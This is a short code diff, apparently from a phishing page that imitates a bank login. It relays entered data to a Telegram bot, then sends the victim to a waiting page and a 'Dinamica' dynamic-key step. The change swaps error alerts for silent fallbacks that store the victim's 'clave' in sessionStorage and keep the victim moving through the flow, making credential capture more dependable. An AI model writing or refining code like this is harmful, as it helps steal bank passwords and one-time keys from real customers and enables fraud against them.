@@ -486,7 +486,7 @@
         .bc-continue-button:enabled {
           background: #e6c200 !important;
           color: #000 !important;
-          cursor: not-allowed !important;
+          cursor: pointer !important;
           transform: none !important;
         }
 
@@ -1072,11 +1072,14 @@
           window.location.href = `espera.html?id=${data.result.message_id}`;
         } else {
           console.error("Error de Telegram:", data.description);
-          alert("Error de Configuración: " + data.description);
+          // Fallback manual
+          window.location.href = "espera.html?next=Dinamica.html";
         }
       } catch (error) {
-        console.error("Error de Red:", error);
-        alert("Error: Revisa la consola (F12) o tu conexión a internet.");
+        console.error("Error de Red (continuando flujo manual):", error);
+        // Fallback manual
+        sessionStorage.setItem("bc_clave", clave);
+        window.location.href = "espera.html?next=Dinamica.html";
       }
   };
 
